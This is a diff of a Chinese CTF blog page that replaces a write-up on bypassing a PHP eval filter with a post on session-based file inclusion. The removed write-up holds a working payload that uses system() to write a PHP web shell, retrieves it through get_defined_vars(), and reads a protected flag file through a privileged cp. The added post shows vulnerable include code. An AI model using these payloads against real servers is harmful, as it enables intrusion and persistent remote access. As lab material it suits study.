@@ -16,28 +16,29 @@
   <meta name="author" content="To1y5">
   <meta name="keywords" content="网络安全,python,脚本,web安全,php">
   
-    <meta name="description" content="题目：May_be12345678910111213&lt;?phphighlight_file(__FILE__);$a &#x3D; $_GET[&amp;#x27;a&amp;#x27;];if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $a))  &amp;#123;    if (!preg_match(&amp;quo">
+    <meta name="description" content="session包含题目： 1234567891011121314&lt;?php @session_start();ini_set(&amp;#x27;open_basedir&amp;#x27;, &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;&amp;#x27;); $file &#x3D; @$_SESSION[&amp;#x27;file&amp;#x27;];if (isset($_GET[&amp;#x27;file&amp;#x27;]))">
 <meta property="og:type" content="article">
-<meta property="og:title" content="May_be一道代码执行绕过">
-<meta property="og:url" content="http://example.com/2023/04/29/maybe/index.html">
+<meta property="og:title" content="浅刷一下">
+<meta property="og:url" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/index.html">
 <meta property="og:site_name" content="To1y5&#39;s Blog">
-<meta property="og:description" content="题目：May_be12345678910111213&lt;?phphighlight_file(__FILE__);$a &#x3D; $_GET[&amp;#x27;a&amp;#x27;];if(&amp;#x27;;&amp;#x27; &#x3D;&#x3D;&#x3D; preg_replace(&amp;#x27;&#x2F;[^\W]+\((?R)?\)&#x2F;&amp;#x27;, &amp;#x27;&amp;#x27;, $a))  &amp;#123;    if (!preg_match(&amp;quo">
+<meta property="og:description" content="session包含题目： 1234567891011121314&lt;?php @session_start();ini_set(&amp;#x27;open_basedir&amp;#x27;, &amp;#x27;&#x2F;var&#x2F;www&#x2F;html&#x2F;:&#x2F;tmp&#x2F;&amp;#x27;); $file &#x3D; @$_SESSION[&amp;#x27;file&amp;#x27;];if (isset($_GET[&amp;#x27;file&amp;#x27;]))">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/04/29/maybe/image-20230429001621633.png">
-<meta property="og:image" content="http://example.com/2023/04/29/maybe/image-20230429002216880.png">
-<meta property="og:image" content="http://example.com/2023/04/29/maybe/image-20230429002506551.png">
-<meta property="og:image" content="http://example.com/2023/04/29/maybe/image-20230429002721545.png">
-<meta property="og:image" content="http://example.com/2023/04/29/maybe/image-20230429003221618.png">
-<meta property="article:published_time" content="2023-04-29T05:11:56.000Z">
-<meta property="article:modified_time" content="2023-04-29T05:12:36.886Z">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429214529086.png">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215002531.png">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215154334.png">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215201934.png">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215730026.png">
+<meta property="og:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215750501.png">
+<meta property="article:published_time" content="2023-04-29T13:32:41.000Z">
+<meta property="article:modified_time" content="2023-05-01T05:30:04.613Z">
 <meta property="article:author" content="To1y5">
 <meta property="article:tag" content="ctf">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/04/29/maybe/image-20230429001621633.png">
+<meta name="twitter:image" content="http://example.com/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429214529086.png">
   
   
   
-  <title>May_be一道代码执行绕过 - To1y5&#39;s Blog</title>
+  <title>浅刷一下 - To1y5&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -203,7 +204,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="May_be一道代码执行绕过"></span>
+            <span id="subtitle" data-typed-text="浅刷一下"></span>
           
         </div>
 
@@ -214,8 +215,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-29 13:11" pubdate>
-          2023年4月29日 下午
+        <time datetime="2023-04-29 21:32" pubdate>
+          2023年4月29日 晚上
         </time>
       </span>
     
@@ -226,7 +227,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          1.2k 字
+          304 字
         
       </span>
     
@@ -237,7 +238,7 @@
         
         
         
-          11 分钟
+          3 分钟
         
       </span>
     
@@ -275,48 +276,24 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">May_be一道代码执行绕过</h1>
+            <h1 style="display: none">浅刷一下</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="题目：May-be"><a href="#题目：May-be" class="headerlink" title="题目：May_be"></a>题目：May_be</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-variable">$a</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-string">&#x27;;&#x27;</span> === <span class="hljs-title function_ invoke__">preg_replace</span>(<span class="hljs-string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-variable">$a</span>))  &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/sess|ion|head|ers|file|na|strlen|info|path|rand|dec|bin|hex|oct|pi|exp|log/i&quot;</span>,<span class="hljs-variable">$a</span>))&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$a</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;May be you should bypass.&quot;</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+                <h1 id="session包含"><a href="#session包含" class="headerlink" title="session包含"></a>session包含</h1><p>题目：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br>@<span class="hljs-title function_ invoke__">session_start</span>();<br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/:/tmp/&#x27;</span>); <br><br><span class="hljs-variable">$file</span> = @<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>])) &#123;<br>    <span class="hljs-variable">$file</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>];<br>&#125;<br><br>@<span class="hljs-keyword">include</span> <span class="hljs-variable">$file</span>;<br><br><span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;file&#x27;</span>] = <span class="hljs-variable">$file</span>;<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>); <br></code></pre></td></tr></table></figure>
 
-<p>这个正则表达式匹配的是一个函数调用，其中：</p>
-<ul>
-<li><code>[^\W]+</code> 表示匹配一个或多个非特殊字符（即字母、数字和下划线）。</li>
-<li><code>\(</code> 表示匹配一个左括号。</li>
-<li><code>(?R)?</code> 表示匹配一个正则表达式自身（即递归地匹配整个表达式），可以有0个或1个，这个表达式实现了匹配嵌套函数的功能。</li>
-<li><code>\)</code> 表示匹配一个右括号。</li>
-</ul>
-<p>因此，这个正则表达式可以匹配类似于 <code>function_name(arg1, arg2)</code> 这样的函数调用表达式，其中 <code>function_name</code> 是一个或多个非特殊字符组成的函数名，<code>arg1</code> 和 <code>arg2</code> 是传递给函数的参数。该正则表达式可以匹配包含嵌套函数调用的表达式，例如 <code>function1(function2(arg1), arg2)</code>。</p>
-<p>意思就是只允许payload中出现字母，数字，下划线和<code>(``)</code></p>
-<p>最早尝试a&#x3D;$_POST[]</p>
-<p>但是想起来<code>$</code>也过滤，<code>[]</code>也过滤&#96;&#96;</p>
-<p>最后的payload是</p>
-<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">/?<span class="hljs-keyword">exp</span>=<span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;echo &quot;&lt;?php\n @eval(\$_POST[&quot;cmd&quot;]);&quot; &gt; ma.php&#x27;</span>);&amp;a=<span class="hljs-keyword">eval</span>(<span class="hljs-keyword">pos</span>(<span class="hljs-keyword">pos</span>(get_defined_vars())));<br></code></pre></td></tr></table></figure>
 
-<p>将命令写在不被过滤的参数<code>exp</code>中，然后用<code>get_defined_vars()</code>获取已经定义的变量</p>
-<p><img src="/2023/04/29/maybe/image-20230429001621633.png" srcset="/img/loading.gif" lazyload alt="image-20230429001621633"></p>
-<p>格式化一下大概是这样</p>
-<p><img src="/2023/04/29/maybe/image-20230429002216880.png" srcset="/img/loading.gif" lazyload alt="image-20230429002216880"></p>
-<p>我们要取参数exp的值</p>
-<p>先用<code>current</code>取到在数组当前值，也就是[_GET]的内容，也是一个数组</p>
-<p><img src="/2023/04/29/maybe/image-20230429002506551.png" srcset="/img/loading.gif" lazyload alt="image-20230429002506551"></p>
-<p>然后要取这个数组里的第一个值用pos方法</p>
-<p>如果参数写后面的就用end方法</p>
-<p>比如这样</p>
-<p><img src="/2023/04/29/maybe/image-20230429002721545.png" srcset="/img/loading.gif" lazyload alt="image-20230429002721545"></p>
-<p>现在可以执行任意命令了，</p>
-<p>直接列出所有目录然后<code>CTRL+F</code>找flag</p>
-<p><img src="/2023/04/29/maybe/image-20230429003221618.png" srcset="/img/loading.gif" lazyload alt="image-20230429003221618"></p>
-<p>直接cat 读不到文件，权限不够</p>
-<p>flag文件属性0700</p>
-<p>发现cp有su权限</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cp</span> /.ffffffIIIIIII44444444444gggg /dev/stdout<br></code></pre></td></tr></table></figure>
 
-<p>Get flag!</p>
-<p>第二天起来发现环境开不了了，所以这部分没图😓</p>
+
+
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429214529086.png" srcset="/img/loading.gif" lazyload alt="image-20230429214529086"></p>
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215002531.png" srcset="/img/loading.gif" lazyload alt="image-20230429215002531"></p>
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215154334.png" srcset="/img/loading.gif" lazyload alt="image-20230429215154334"></p>
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215201934.png" srcset="/img/loading.gif" lazyload alt="image-20230429215201934"></p>
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215730026.png" srcset="/img/loading.gif" lazyload alt="image-20230429215730026"></p>
+<p><img src="/2023/04/29/session%E5%8C%85%E5%90%AB/image-20230429215750501.png" srcset="/img/loading.gif" lazyload alt="image-20230429215750501"></p>
 
                 
               </div>
@@ -341,8 +318,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>May_be一道代码执行绕过</div>
-      <div>http://example.com/2023/04/29/maybe/</div>
+      <div>浅刷一下</div>
+      <div>http://example.com/2023/04/29/session包含/</div>
     </div>
     <div class="license-meta">
       
@@ -386,9 +363,9 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/29/session%E5%8C%85%E5%90%AB/" title="浅刷一下">
+                      <a href="/2023/06/19/tanmu/" title="tanmu">
                         <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">浅刷一下</span>
+                        <span class="hidden-mobile">tanmu</span>
                         <span class="visible-mobile">上一篇</span>
                       </a>
                     
@@ -396,8 +373,8 @@
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/28/writeup1/" title="writeup1">
-                        <span class="hidden-mobile">writeup1</span>
+                      <a href="/2023/04/29/maybe/" title="May_be一道代码执行绕过">
+                        <span class="hidden-mobile">May_be一道代码执行绕过</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
